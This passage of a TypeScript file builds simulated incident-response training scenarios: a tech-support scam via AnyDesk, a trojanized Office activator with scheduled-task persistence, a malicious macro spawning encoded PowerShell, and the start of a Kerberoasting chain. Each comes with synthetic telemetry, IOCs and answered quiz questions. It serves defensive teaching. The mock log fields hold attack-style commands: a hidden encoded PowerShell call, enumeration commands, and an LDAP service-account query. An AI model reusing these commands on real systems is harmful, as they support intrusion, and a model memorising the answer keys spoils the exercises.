        "file.signed": "true",
        "file.signer": "philandro Software GmbH",
        "user.name": "NEXACORP\\t.mizrahi",
        "host.name": victim.hostname,
      },
    },
    {
      id: "evt_rat_02_execute", ts: T(4 * MIN),
      source: "edr", vendor: "SentinelOne", event_type: "process_create",
      hostname: victim.hostname, user_email: victim.email, src_ip: victim.ip,
      severity: "high", mitre_technique: "T1219",
      description: "t.mizrahi launched AnyDesk.exe on WS-ACC-4477 and granted remote-control access to an inbound session from an external caller.",
      process: {
        name: "AnyDesk.exe", pid: 5210, parent_name: "explorer.exe", parent_pid: 3140,
        cmdline: "\"C:\\Users\\t.mizrahi\\Downloads\\AnyDesk.exe\"",
        user: "NEXACORP\\t.mizrahi", integrity: "medium",
        hash: { sha256: toolHash },
      },
      raw: {
        "s1.event_type": "PROCESS_CREATION",
        "s1.threat_level": "suspicious",
        "s1.detection.classification": "PUA",
        "s1.detection.classification_source": "Engine",
        "s1.mitigation_status": "not_mitigated",
        "process.name": "AnyDesk.exe",
        "process.pid": "5210",
        "process.executable": "C:\\Users\\t.mizrahi\\Downloads\\AnyDesk.exe",
        "process.command_line": "\"C:\\Users\\t.mizrahi\\Downloads\\AnyDesk.exe\"",
        "process.parent.name": "explorer.exe",
        "file.signed": "true",
        "network.destination": "relay.anydesk.com",
        "user.name": "NEXACORP\\t.mizrahi",
        "host.name": victim.hostname,
        "action_result": "allowed",
      },
    },
    {
      id: "evt_rat_03_shell", ts: T(4 * MIN + 90_000),
      source: "edr", vendor: "SentinelOne", event_type: "process_create",
      hostname: victim.hostname, user_email: victim.email,
      severity: "medium", mitre_technique: "T1059.003",
      description: "cmd.exe was spawned directly by AnyDesk.exe on WS-ACC-4477 and ran basic system and network enumeration commands.",
      process: {
        name: "cmd.exe", pid: 5540, parent_name: "AnyDesk.exe", parent_pid: 5210,
        cmdline: "cmd.exe /c systeminfo & netstat -ano",
        user: "NEXACORP\\t.mizrahi", integrity: "medium",
      },
      raw: {
        "s1.event_type": "PROCESS_CREATION",
        "s1.threat_level": "suspicious",
        "s1.detection.classification": "Suspicious Activity",
        "s1.detection.classification_source": "Behavioral Engine",
        "process.name": "cmd.exe",
        "process.pid": "5540",
        "process.command_line": "cmd.exe /c systeminfo & netstat -ano",
        "process.parent.name": "AnyDesk.exe",
        "process.parent.pid": "5210",
        "user.name": "NEXACORP\\t.mizrahi",
        "host.name": victim.hostname,
      },
    },
    {
      id: "evt_rat_04_detect", ts: T(6 * MIN),
      source: "edr", vendor: "SentinelOne", event_type: "av_quarantine",
      hostname: victim.hostname, user_email: victim.email,
      severity: "critical", mitre_technique: "T1219",
      description: "SentinelOne terminated AnyDesk.exe on WS-ACC-4477 after flagging it as an unapproved remote-access tool controlling a session and spawning shell commands.",
      raw: {
        "s1.event_type": "PROCESS_CREATION",
        "s1.threat_level": "malicious",
        "s1.detection.classification": "PUA",
        "s1.detection.classification_source": "Behavioral Engine",
        "s1.mitigation_status": "mitigated",
        "s1.threat.name": "PUA.RemoteAdmin.AnyDesk",
        "s1.threat.id": "TH-441-2026",
        "process.name": "AnyDesk.exe",
        "process.hash.sha256": toolHash,
        "host.name": victim.hostname,
        "action_result": "blocked",
      },
    },
  ];

  const iocs: IOC[] = [
    { type: "sha256", value: toolHash, reputation: "suspicious", tags: ["unapproved-remote-access-tool"] },
  ];

  return {
    scenario_id: scenarioId,
    title: "Tech-Support Scam → Unapproved Remote Access Tool",
    threat_actor: "Tech-Support Scam Operator (opportunistic, financially motivated)",
    attack_kind: "tech_support_scam_basic",
    briefing: "SentinelOne terminated a process on WS-ACC-4477 at 14:20 and flagged unapproved software running under t.mizrahi's session. The user has not opened a ticket. Establish what was running and what it did while it was up.",
    narrative: "t.mizrahi received a call from someone claiming to be Microsoft technical support and was talked into downloading and running AnyDesk, then granting the caller remote control of WS-ACC-4477. The caller ran basic system enumeration commands through the remote session before SentinelOne flagged the unapproved remote-access tool and terminated it.",
    learning_objectives: [
      "Recognize that a legitimate, signed tool can still be the vehicle for an attack when used outside policy (T1219)",
      "Identify a remote-access tool spawning a command shell as an observable pivot point (T1059.003)",
      "Understand that social engineering over the phone is as real an initial-access vector as email or USB",
      "See that 'blocked' at the end does not undo whatever happened during the minutes the session was active",
    ],
    events,
    iocs,
    alerts: eventsToAlerts(events, scenarioId),
    killchain: [
      { ts: T(0),                phase: "Preparation",  action: "AnyDesk.exe downloaded to Downloads at the caller's instruction" },
      { ts: T(4 * MIN),          phase: "Initial Access", action: "t.mizrahi runs AnyDesk and grants remote control to the caller" },
      { ts: T(4 * MIN + 90_000), phase: "Discovery",      action: "cmd.exe spawned by AnyDesk runs system and network enumeration" },
      { ts: T(6 * MIN),          phase: "Detection",      action: "EDR flags the unapproved remote-access tool and terminates it" },
    ],
    questions: [
      { id: "q1", prompt: "AnyDesk.exe is a legitimate, digitally signed application. Does that mean this event chain is not a security incident?", kind: "single",
        options: [
          { value: "yes", label: "Yes — a signed binary from a known vendor can never be part of an attack" },
          { value: "no",  label: "No — legitimate remote-access tools are commonly abused in tech-support scams; the context of how and why it was installed matters more than the file's signature" },
        ],
        answer: "no", xp: 40,
        explanation: "Attackers frequently use legitimate, signed software as their entry point specifically because it does not trigger traditional malware signatures. A signed binary is not automatically safe — it matters who installed it, why, and whether it is on the approved software list for that environment." },
      { id: "q2", prompt: "Which single detail here is the strongest indicator of a tech-support scam, as opposed to a normal IT remote session?", kind: "single",
        options: [
          { value: "cmd",  label: "cmd.exe was spawned directly by AnyDesk.exe rather than through the company's approved helpdesk tool" },
          { value: "size", label: "AnyDesk.exe is about 4MB in size" },
          { value: "dept", label: "t.mizrahi works in accounting" },
        ],
        answer: "cmd", xp: 50,
        explanation: "The company has a designated helpdesk tool for legitimate remote support. A personally-installed AnyDesk session with no prior history on the host, followed by shell commands run through it, is a strong deviation from the normal IT support process — that is the actual observable, not the file size or department." },
      { id: "q3", prompt: "The EDR shows 'action_result: blocked' with Critical severity. Is the incident fully resolved at that point?", kind: "single",
        options: [
          { value: "yes", label: "Yes — blocking the process means the threat is fully neutralized" },
          { value: "no",  label: "No — the remote session was active for several minutes before being blocked; the analyst still needs to confirm what the caller actually did and document the incident" },
        ],
        answer: "no", xp: 60,
        explanation: "Blocking the process stops further access, but does not undo whatever the caller already saw or did during the active session. A SOC analyst still needs to review what commands were run, whether any data was viewed or copied, and write up the incident for the user's awareness training." },
    ],
  };
}

// =========================================================================
// Foundation Scenario E: Cracked Software Installer → Scheduled Task Persistence
// Fifth beginner-tier scenario — infection vector is a trojanized installer
// from a sponsored search-ad result, distinct persistence mechanism
// (scheduled task, not registry Run key) from the USB scenario. One host,
// one user, EDR (+ one firewall event for the initial download).
// =========================================================================

export function buildCrackedSoftwareScenario(scenarioId = "cracked-software-installer-2026"): ScenarioBundle {
  const B = new Date("2026-05-29T20:10:00Z").getTime();
  const T = (ms: number) => new Date(B + ms).toISOString();
  const MIN = 60_000;

  const victim = { hostname: "WS-ENG-2093", email: "y.golan@nexacorp.com", ip: "10.10.48.55" };
  const downloadDomain = "fast-office-tools-download.top";
  const installerHash = makeSha256("office_activator_setup_installer");
  const payloadHash = makeSha256("cracked_installer_dropped_payload");

  const events: TelemetryEvent[] = [
    {
      id: "evt_crack_01_download", ts: T(0),
      source: "firewall", vendor: "Palo Alto Networks PAN-OS", event_type: "net_connection",
      hostname: victim.hostname, user_email: victim.email,
      src_ip: victim.ip, dst_ip: "198.51.100.212", dst_port: 443, protocol: "tcp",
      severity: "low",
      network: { bytes_out: 2048, bytes_in: 18874368, domain: downloadDomain },
      description: "WS-ENG-2093 downloaded Office_Pro_2026_Activator_Setup.exe from fast-office-tools-download.top at 20:14, following a sponsored search result click.",
      raw: {
        "event.action": "network-connection-allowed", "event.outcome": "success",
        "source.ip": victim.ip, "source.port": "58122",
        "destination.ip": "198.51.100.212", "destination.port": "443",
        "network.protocol": "tcp", "network.transport": "tcp",
        "network.application": "ssl",
        "pan.app": "ssl", "pan.action": "allow", "pan.rule": "ALLOW-OUTBOUND-HTTPS",
        "network.bytes_out": "2048", "network.bytes_in": "18874368",
        "dns.query_domain": downloadDomain,
        "action_result": "allow",
      },
    },
    {
      id: "evt_crack_02_execute", ts: T(6 * MIN),
      source: "edr", vendor: "Microsoft Defender for Endpoint", event_type: "process_create",
      hostname: victim.hostname, user_email: victim.email, src_ip: victim.ip,
      severity: "high", mitre_technique: "T1204.002",
      description: "y.golan ran Office_Pro_2026_Activator_Setup.exe on WS-ENG-2093 with explorer.exe as the parent process; the binary is unsigned.",
      process: {
        name: "Office_Pro_2026_Activator_Setup.exe", pid: 6120, parent_name: "explorer.exe", parent_pid: 3140,
        cmdline: "\"C:\\Users\\y.golan\\Downloads\\Office_Pro_2026_Activator_Setup.exe\"",
        user: "NEXACORP\\y.golan", integrity: "medium",
        hash: { sha256: installerHash },
      },
      raw: {
        "Timestamp": T(6 * MIN),
        "ActionType": "ProcessCreated",
        "FileName": "Office_Pro_2026_Activator_Setup.exe",
        "FolderPath": "C:\\Users\\y.golan\\Downloads\\Office_Pro_2026_Activator_Setup.exe",
        "SHA256": installerHash,
        "ProcessId": "6120",
        "ProcessCommandLine": "\"C:\\Users\\y.golan\\Downloads\\Office_Pro_2026_Activator_Setup.exe\"",
        "ProcessIntegrityLevel": "Medium",
        "SignatureStatus": "Unsigned",
        "InitiatingProcessFileName": "explorer.exe",
        "InitiatingProcessId": "3140",
        "InitiatingProcessAccountName": "y.golan",
        "InitiatingProcessAccountDomain": "nexacorp",
        "DeviceName": victim.hostname,
        "AttackTechniques": ["T1204.002"],
        "ReportId": "889213",
      },
    },
    {
      id: "evt_crack_03_persist", ts: T(6 * MIN + 40_000),
      source: "edr", vendor: "Microsoft Defender for Endpoint", event_type: "scheduled_task",
      hostname: victim.hostname, user_email: victim.email,
      severity: "high", mitre_technique: "T1053.005",
      description: "Office_Pro_2026_Activator_Setup.exe created a scheduled task named OfficeLicenseRefresh on WS-ENG-2093 that runs C:\\ProgramData\\OfficeTools\\svchelper.exe every 30 minutes.",
      raw: {
        "Timestamp": T(6 * MIN + 40_000),
        "ActionType": "ScheduledTaskCreated",
        "TaskName": "OfficeLicenseRefresh",
        "FolderPath": "C:\\ProgramData\\OfficeTools\\svchelper.exe",
        "SHA256": payloadHash,
        "InitiatingProcessFileName": "Office_Pro_2026_Activator_Setup.exe",
        "InitiatingProcessAccountName": "y.golan",
        "DeviceName": victim.hostname,
        "AttackTechniques": ["T1053.005"],
        "ReportId": "889214",
      },
    },
    {
      id: "evt_crack_04_detect", ts: T(9 * MIN),
      source: "edr", vendor: "Microsoft Defender for Endpoint", event_type: "av_quarantine",
      hostname: victim.hostname, user_email: victim.email,
      severity: "critical", mitre_technique: "T1053.005",
      file: { path: "C:\\ProgramData\\OfficeTools\\svchelper.exe", sha256: payloadHash, size: 512000 },
      description: "Microsoft Defender quarantined svchelper.exe on WS-ENG-2093 as a known trojan, removed the scheduled task, and terminated the installer.",
      raw: {
        "Timestamp": T(9 * MIN),
        "ActionType": "AntivirusDetection",
        "ThreatName": "Trojan:Win32/Wacatac.B!ml",
        "FileName": "svchelper.exe",
        "FolderPath": "C:\\ProgramData\\OfficeTools\\svchelper.exe",
        "SHA256": payloadHash,
        "DeviceName": victim.hostname,
        "action_result": "quarantined",
      },
    },
  ];

  const iocs: IOC[] = [
    { type: "domain", value: downloadDomain, reputation: "suspicious", tags: ["cracked-software-host"] },
    { type: "sha256", value: installerHash, reputation: "malicious", tags: ["trojanized-installer"] },
    { type: "sha256", value: payloadHash,   reputation: "malicious", tags: ["dropped-payload", "scheduled-task-persistence"] },
  ];

  return {
    scenario_id: scenarioId,
    title: "Cracked Software Installer → Scheduled Task Persistence",
    threat_actor: "Commodity Malware Operator (opportunistic, financially motivated)",
    attack_kind: "cracked_software_installer_basic",
    briefing: "Microsoft Defender quarantined a file on WS-ENG-2093 at 20:25 and reported removing a scheduled task on the same host. The activity is well outside business hours and y.golan is the assigned user, who has reported nothing.",
    narrative: "y.golan searched for a free way to activate Office, clicked a sponsored ad, and downloaded a trojanized activator installer late in the evening. Running it dropped a second executable that set up a recurring scheduled task for persistence, and was later caught and quarantined by Microsoft Defender — but only after the payload had already run.",
    learning_objectives: [
      "Recognize a trojanized installer served through a sponsored search-ad as an infection vector distinct from email or USB",
      "Identify user execution of an unsigned, never-before-seen binary (T1204.002)",
      "Understand Scheduled Task persistence (T1053.005) as a common alternative to a Registry Run key",
      "See that off-hours activity and unsigned binaries from user-writable paths are both independent, stackable red flags",
    ],
    events,
    iocs,
    alerts: eventsToAlerts(events, scenarioId),
    killchain: [
      { ts: T(0),                phase: "Initial Access", action: "Trojanized activator installer downloaded from a sponsored ad result" },
      { ts: T(6 * MIN),          phase: "Execution",      action: "y.golan runs the installer — dropped payload begins" },
      { ts: T(6 * MIN + 40_000), phase: "Persistence",    action: "A scheduled task is created to relaunch the payload every 30 minutes" },
      { ts: T(9 * MIN),          phase: "Detection",      action: "EDR identifies the trojan and quarantines it" },
    ],
    questions: [
      { id: "q1", prompt: "What made this download suspicious even before the installer was run?", kind: "single",
        options: [
          { value: "time", label: "It was downloaded at 20:14, outside normal business hours, from a sponsored ad rather than an official vendor site" },
          { value: "size", label: "The file was larger than 15MB" },
          { value: "dept", label: "y.golan works in engineering, not IT" },
        ],
        answer: "time", xp: 40,
        explanation: "Off-hours activity combined with a download source that is not the software vendor's own site (a sponsored ad leading to a third-party 'activator' download) is a meaningful combination of red flags. File size and department alone are not reliable indicators." },
      { id: "q2", prompt: "How does this scenario's persistence mechanism differ from a Registry Run key?", kind: "single",
        options: [
          { value: "task", label: "A scheduled task was created to relaunch the payload on a recurring interval and at logon, rather than a HKCU\\...\\Run registry value" },
          { value: "none", label: "There is no difference — both are the same underlying mechanism" },
        ],
        answer: "task", xp: 50,
        explanation: "Scheduled Task persistence (T1053.005) and Registry Run Key persistence (T1547.001) are both common but technically distinct techniques for surviving a reboot. Recognizing both is important because defenders and EDR products check different artifacts to detect and remove each one." },
      { id: "q3", prompt: "Microsoft Defender quarantined svchelper.exe and removed the scheduled task. Is the workstation fully clean at that point without further review?", kind: "single",
        options: [
          { value: "yes", label: "Yes — quarantine and task removal fully undo everything the payload did" },
          { value: "no",  label: "No — the payload ran for several minutes before detection; the analyst should still confirm no other files or configuration changes were left behind" },
        ],
        answer: "no", xp: 60,
        explanation: "Quarantining the file and removing the scheduled task stop the immediate threat, but do not by themselves prove nothing else happened while the payload was running. A thorough analyst still checks for other dropped files, modified settings, or additional persistence before closing the incident." },
    ],
  };
}

// =========================================================================
// Foundation Scenario F: Malicious Office Macro → PowerShell Execution
// Sixth beginner-tier scenario — a simpler cousin of the phishing-malware
// chain: a single macro-enabled attachment leads straight to WINWORD.EXE
// spawning PowerShell. No exfiltration, just the initial execution chain.
// =========================================================================

export function buildMaliciousMacroScenario(scenarioId = "malicious-macro-2026"): ScenarioBundle {
  const B = new Date("2026-06-01T11:20:00Z").getTime();
  const T = (ms: number) => new Date(B + ms).toISOString();
  const MIN = 60_000;

  const victim = { hostname: "WS-SALES-1876", email: "s.peretz@nexacorp.com", ip: "10.10.33.91" };
  const c2Domain = "invoice-sync-cdn.xyz";
  const c2Ip = "185.220.101.142";

  const events: TelemetryEvent[] = [
    {
      id: "evt_macro_01_email", ts: T(0),
      source: "o365", vendor: "Microsoft Defender for Office 365", event_type: "email_received",
      user_email: victim.email, src_ip: "45.148.10.203",
      severity: "medium", mitre_technique: "T1566.001",
      description: "s.peretz received an email with a macro-enabled Word attachment (Q3_Client_Invoice_Review.docm) from an external sender. SPF and DKIM both failed.",
      raw: {
        "event.action": "EmailDelivered", "event.outcome": "success",
        "email.from.address": "billing@client-invoices-portal.info",
        "email.to.address": victim.email,
        "email.subject": "Q3 Invoice Review — Please Confirm by Friday",
        "email.attachment.name": "Q3_Client_Invoice_Review.docm",
        "email.direction": "inbound",
        "file.size": "48210",
        "source.ip": "45.148.10.203",
        "spf.result": "fail", "dkim.result": "fail", "dmarc.result": "fail",
        "action_result": "delivered",
        "block.reason": "No matching transport rule — macro-enabled document type not blocklisted",
        "threat.category": "Phishing",
      },
    },
    {
      id: "evt_macro_02_powershell", ts: T(8 * MIN),
      source: "edr", vendor: "CrowdStrike Falcon", event_type: "process_create",
      hostname: victim.hostname, user_email: victim.email, src_ip: victim.ip,
      severity: "high", mitre_technique: "T1059.001",
      description: "s.peretz opened Q3_Client_Invoice_Review.docm and enabled content; WINWORD.EXE on WS-SALES-1876 then spawned powershell.exe with a hidden window and an encoded command.",
      process: {
        name: "powershell.exe", pid: 7340, parent_name: "WINWORD.EXE", parent_pid: 4512,
        cmdline: "powershell.exe -NoP -W Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0AA==",
        user: "NEXACORP\\s.peretz", integrity: "medium",
      },
      raw: {
        "crowdstrike.event_simplename": "ProcessRollup2",
        "crowdstrike.detection.id": "ldt:a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4:5234567890",
        "crowdstrike.detection.description": "powershell.exe launched as a direct child of WINWORD.EXE with a hidden window style and an encoded command argument, consistent with a malicious macro.",
        "crowdstrike.detection.scenario": "office_spawned_scripting_interpreter",
        "crowdstrike.detection.tactic": "Execution",
        "crowdstrike.detection.tactic_id": "TA0002",
        "crowdstrike.detection.technique": "Command and Scripting Interpreter: PowerShell",
        "crowdstrike.detection.technique_id": "T1059.001",
        "crowdstrike.detection.pattern_disposition": "10",
        "crowdstrike.detection.pattern_disposition_description": "Detection, No Action",
        "crowdstrike.detection.severity": "High",
        "crowdstrike.behaviors": "Parent process is Microsoft Word|Hidden window style|Base64-encoded command argument|Document macros were enabled minutes earlier",
        "process.pid": "7340",
        "process.executable": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
        "process.command_line": "powershell.exe -NoP -W Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0AA==",
        "process.parent.name": "WINWORD.EXE",
        "process.parent.pid": "4512",
        "user.name": "NEXACORP\\s.peretz",
        "host.name": victim.hostname,
      },
    },
    {
      id: "evt_macro_03_beacon", ts: T(8 * MIN + 25_000),
      source: "firewall", vendor: "Palo Alto Networks PAN-OS", event_type: "net_connection",
      hostname: victim.hostname, user_email: victim.email,
      src_ip: victim.ip, dst_ip: c2Ip, dst_port: 443, protocol: "tcp",
      severity: "high", mitre_technique: "T1071.001",
      network: { bytes_out: 2560, bytes_in: 32768, domain: c2Domain },
      description: "WS-SALES-1876 opened a TLS connection to invoice-sync-cdn.xyz, a domain registered 3 days ago; the firewall allowed the session.",
      raw: {
        "event.action": "network-connection-allowed", "event.outcome": "success",
        "source.ip": victim.ip, "source.port": "55931",
        "destination.ip": c2Ip, "destination.port": "443",
        "network.protocol": "tcp", "network.transport": "tcp",
        "network.application": "ssl",
        "pan.app": "ssl", "pan.action": "allow", "pan.rule": "ALLOW-OUTBOUND-HTTPS",
        "network.bytes_out": "2560", "network.bytes_in": "32768",
        "dns.query_domain": c2Domain,
        "domain.registration_age_days": "3",
        "action_result": "allow",
      },
    },
    {
      id: "evt_macro_04_detect", ts: T(11 * MIN),
      source: "edr", vendor: "CrowdStrike Falcon", event_type: "av_quarantine",
      hostname: victim.hostname, user_email: victim.email,
      severity: "critical", mitre_technique: "T1059.001",
      file: { path: "C:\\Users\\s.peretz\\Downloads\\Q3_Client_Invoice_Review.docm", size: 48210 },
      description: "CrowdStrike Falcon killed the encoded PowerShell process on WS-SALES-1876, matching a known commodity loader (family: Emotet-variant).",
      raw: {
        "crowdstrike.event_simplename": "DetectionSummaryEvent",
        "crowdstrike.detection.id": "ldt:a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4:5234567891",
        "crowdstrike.detection.description": "Known macro-loader signature match — encoded PowerShell process killed and macro document quarantined.",
        "crowdstrike.detection.scenario": "known_malware_family",
        "crowdstrike.detection.tactic": "Execution",
        "crowdstrike.detection.tactic_id": "TA0002",
        "crowdstrike.detection.technique": "Command and Scripting Interpreter: PowerShell",
        "crowdstrike.detection.technique_id": "T1059.001",
        "crowdstrike.detection.pattern_disposition": "128",
        "crowdstrike.detection.pattern_disposition_description": "Prevention, Kill Process, Quarantine File",
        "crowdstrike.detection.severity": "Critical",
        "crowdstrike.threat.name": "Trojan.Emotet-variant",
        "crowdstrike.behaviors": "Known macro-loader signature match|Process terminated|Document quarantined",
        "host.name": victim.hostname,
        "action_result": "quarantined",
      },
    },
  ];

  const iocs: IOC[] = [
    { type: "domain", value: c2Domain, reputation: "malicious", tags: ["external-infrastructure", "registered-3-days-ago"] },
    { type: "ip",     value: c2Ip,     reputation: "malicious", tags: ["external-infrastructure"] },
  ];

  return {
    scenario_id: scenarioId,
    title: "Malicious Office Macro → PowerShell Execution",
    threat_actor: "Commodity Malware Operator (opportunistic, financially motivated)",
    attack_kind: "malicious_macro_basic",
    briefing: "CrowdStrike Falcon killed a process on WS-SALES-1876 (s.peretz) at 11:26. The mail gateway logged an inbound attachment to the same user a few minutes earlier, and the firewall shows an outbound connection from the host in between.",
    narrative: "s.peretz received a phishing email with a macro-enabled Word attachment disguised as an invoice review request. Enabling content caused WINWORD.EXE to spawn an encoded PowerShell command, which reached out to a freshly-registered domain before CrowdStrike caught and quarantined it.",
    learning_objectives: [
      "Recognize a macro-enabled Office attachment as a delivery mechanism (T1566.001)",
      "Identify an Office application spawning PowerShell as the clearest sign of macro execution (T1059.001)",
      "Understand that a firewall ALLOW on a brand-new domain is not the same as safe",
      "See the simplest version of the macro-to-execution chain, without any data exfiltration stage",
    ],
    events,
    iocs,
    alerts: eventsToAlerts(events, scenarioId),
    killchain: [
      { ts: T(0),                phase: "Initial Access",    action: "Phishing email with macro-enabled attachment delivered to s.peretz" },
      { ts: T(8 * MIN),          phase: "Execution",         action: "s.peretz enables content — WINWORD.EXE spawns encoded PowerShell" },
      { ts: T(8 * MIN + 25_000), phase: "Command & Control", action: "PowerShell beacons out to a 3-day-old domain; firewall allows it" },
      { ts: T(11 * MIN),         phase: "Detection",         action: "EDR kills the PowerShell process and quarantines the document" },
    ],
    questions: [
      { id: "q1", prompt: "What is the clearest technical sign that the Word document's macro did something dangerous?", kind: "single",
        options: [
          { value: "parent", label: "WINWORD.EXE was the parent process of powershell.exe" },
          { value: "size",   label: "The attachment was under 50KB" },
          { value: "sender", label: "The email came from an external address" },
        ],
        answer: "parent", xp: 40,
        explanation: "Microsoft Word never legitimately needs to launch a scripting interpreter as a child process. Whenever WINWORD.EXE (or any Office app) appears as the parent of powershell.exe or cmd.exe, that parent-child relationship is the direct evidence of macro-driven execution — file size and sender domain are supporting context, not the direct proof." },
      { id: "q2", prompt: "Compared to a phishing email with a ZIP-wrapped executable attachment, what is different about this macro-based chain?", kind: "single",
        options: [
          { value: "exec", label: "The malicious code runs inside a trusted Office process (WINWORD.EXE) rather than as its own standalone executable" },
          { value: "none", label: "Nothing — the two techniques are identical" },
        ],
        answer: "exec", xp: 50,
        explanation: "A macro executes inside the Office application itself, so the very first malicious action (spawning PowerShell) comes from a process the user and many security tools already trust, rather than a newly-launched suspicious .exe. This is why macro-based delivery remains effective even in environments that block unusual attachment types." },
      { id: "q3", prompt: "At what point was WS-SALES-1876 actually compromised?", kind: "single",
        options: [
          { value: "email",   label: "When the phishing email arrived in the inbox" },
          { value: "execute", label: "When s.peretz enabled content and the macro spawned PowerShell" },
          { value: "detect",  label: "When CrowdStrike killed the process" },
        ],
        answer: "execute", xp: 60,
        explanation: "Compromise happens at execution, not at delivery or at detection. The email sitting unopened is not a compromise, and the detection at the end is the response catching up to an infection that already happened minutes earlier." },
    ],
  };
}

// =========================================================================
// Scenario 7: Kerberoasting → Service Account Abuse → xp_cmdshell
// =========================================================================

export function buildKerberoastingScenario(scenarioId = "kerberoasting-2026"): ScenarioBundle {
  const B = new Date("2026-05-15T10:00:00Z").getTime();
  const T = (ms: number) => new Date(B + ms).toISOString();
  const MIN = 60_000;

  const attackerHost = "WS-DEV-4412";
  const attackerUser = "m.cohen@nexacorp.com";
  const attackerIp = "10.10.30.44";
  const dcIp = "10.10.1.5";
  const sqlHash = makeSha256("cracked_svc_mssql_password");

  const events: TelemetryEvent[] = [
    // T+0: Normal domain auth — attacker foothold
    {
      id: "evt_kerb_01_logon", ts: T(0),
      source: "ad", vendor: "Windows Security", event_type: "auth_success",
      hostname: attackerHost, user_email: attackerUser, src_ip: attackerIp,
      severity: "informational",
      description: "m.cohen logged on interactively to developer workstation WS-DEV-4412.",
      raw: {
        "winlog.event_id": "4624",
        "winlog.channel": "Security",
        "winlog.computer_name": attackerHost,
        "winlog.provider_name": "Microsoft-Windows-Security-Auditing",
        "winlog.record_id": "1109842",
        "winlog.event_data.SubjectUserSid": "S-1-5-18",
        "winlog.event_data.SubjectUserName": `${attackerHost}$`,
        "winlog.event_data.SubjectDomainName": "NEXACORP",
        "winlog.event_data.SubjectLogonId": "0x3E7",
        "winlog.event_data.TargetUserSid": "S-1-5-21-3421479547-3897544621-1789562108-1204",
        "winlog.event_data.TargetUserName": "m.cohen",
        "winlog.event_data.TargetDomainName": "NEXACORP",
        "winlog.event_data.TargetLogonId": "0xA2F8C1",
        "winlog.event_data.LogonType": "2",
        "winlog.event_data.LogonProcessName": "User32",
        "winlog.event_data.AuthenticationPackageName": "Kerberos",
        "winlog.event_data.WorkstationName": attackerHost,
        "winlog.event_data.IpAddress": attackerIp,
        "winlog.event_data.IpPort": "0",
        "event.code": "4624",
        "event.action": "logged-in",
        "event.outcome": "success",
        "user.name": "NEXACORP\\m.cohen",
        "user.domain": "NEXACORP",
        "host.name": attackerHost,
        "source.ip": attackerIp,
        "authentication.protocol": "Kerberos",
      },
    },

    // T+2min: LDAP query to enumerate SPNs (T1087.002 / BloodHound/PowerView)
    {
      id: "evt_kerb_02_ldap_spn", ts: T(2 * MIN),
      source: "ad", vendor: "Windows Security", event_type: "cloud_api_call",
      hostname: attackerHost, user_email: attackerUser, src_ip: attackerIp,
      severity: "high", mitre_technique: "T1087.002", mitre_tactic: "TA0007",
      description: "m.cohen's workstation sent an LDAP query for every account with a servicePrincipalName set, returning 8 results.",
      raw: {
        "winlog.event_id": "4662",
        "winlog.channel": "Security",
        "winlog.computer_name": dcIp,
        "winlog.provider_name": "Microsoft-Windows-Security-Auditing",
        "winlog.event_data.SubjectUserName": "m.cohen",
        "winlog.event_data.SubjectDomainName": "NEXACORP",
        "winlog.event_data.ObjectType": "servicePrincipalName",
        "winlog.event_data.ObjectName": "CN=Users,DC=nexacorp,DC=com",
        "winlog.event_data.AccessMask": "0x100",
        "winlog.event_data.Properties": "Read Property",
        "event.code": "4662",
        "event.action": "object-access",
        "event.outcome": "success",
        "ldap.filter": "(&(objectCategory=user)(servicePrincipalName=*))",
        "ldap.scope": "subtree",
        "ldap.attributes_requested": ["servicePrincipalName", "sAMAccountName", "distinguishedName", "pwdLastSet"],
        "ldap.results_returned": "8",
        "user.name": "NEXACORP\\m.cohen",
        "host.name": dcIp,
        "source.ip": attackerIp,
      },
    },

    // T+4min: TGS request for MSSQLSvc (T1558.003 — Kerberoasting)
    {
      id: "evt_kerb_03_tgs_sql", ts: T(4 * MIN),
      source: "ad", vendor: "Windows Security", event_type: "auth_success",
      hostname: dcIp, user_email: attackerUser, src_ip: attackerIp,
      severity: "high", mitre_technique: "T1558.003", mitre_tactic: "TA0006",
      description: "m.cohen requested a Kerberos TGS ticket for MSSQLSvc/srv-db01:1433 (svc-mssql) using RC4 encryption (0x17), two minutes after the SPN enumeration.",
      raw: {
        "winlog.event_id": "4769",
        "winlog.channel": "Security",
        "winlog.computer_name": "DC01.nexacorp.com",
        "winlog.provider_name": "Microsoft-Windows-Security-Auditing",
        // 4769: TargetUserName is the REQUESTING principal, not the service.
        "winlog.event_data.TargetUserName": "m.cohen@NEXACORP.COM",
        "winlog.event_data.TargetDomainName": "NEXACORP.COM",
        // ServiceName carries the service ACCOUNT name; the SPN that was
        // requested (MSSQLSvc/srv-db01:1433) is named in the event description.
        "winlog.event_data.ServiceName": "svc-mssql",
        "winlog.event_data.ServiceSid": "S-1-5-21-3421479547-3897544621-1789562108-1301",
        "winlog.event_data.TicketOptions": "0x40810000",
        "winlog.event_data.TicketEncryptionType": "0x17",
        "winlog.event_data.IpAddress": attackerIp,
        "winlog.event_data.IpPort": "51244",
        "winlog.event_data.Status": "0x0",
        "event.code": "4769",
        "event.action": "kerberos-service-ticket-requested",
        "event.outcome": "success",
        "kerberos.encryption_type": "RC4-HMAC",
        "kerberos.ticket_options": "Forwardable, Renewable, Canonicalize, RenewableOk",
        "user.name": "m.cohen",
        "host.name": "DC01.nexacorp.com",
        "source.ip": attackerIp,
      },
    },

    // T+4min+20s: TGS for HTTP/intranet
    {
      id: "evt_kerb_04_tgs_iis", ts: T(4 * MIN + 20_000),
      source: "ad", vendor: "Windows Security", event_type: "auth_success",
      hostname: dcIp, user_email: attackerUser, src_ip: attackerIp,
      severity: "high", mitre_technique: "T1558.003", mitre_tactic: "TA0006",
      description: "m.cohen requested a second RC4-encrypted TGS ticket, this time for HTTP/intranet.corp (svc-iis), 20 seconds after the first.",
      raw: {
        "winlog.event_id": "4769",
        "winlog.channel": "Security",
        "winlog.computer_name": "DC01.nexacorp.com",
        "winlog.provider_name": "Microsoft-Windows-Security-Auditing",
        // 4769: TargetUserName is the REQUESTING principal, not the service.
        "winlog.event_data.TargetUserName": "m.cohen@NEXACORP.COM",
        "winlog.event_data.TargetDomainName": "NEXACORP.COM",
        // ServiceName carries the service ACCOUNT name; the SPN that was
        // requested (HTTP/intranet.corp) is named in the event description.
        "winlog.event_data.ServiceName": "svc-iis",
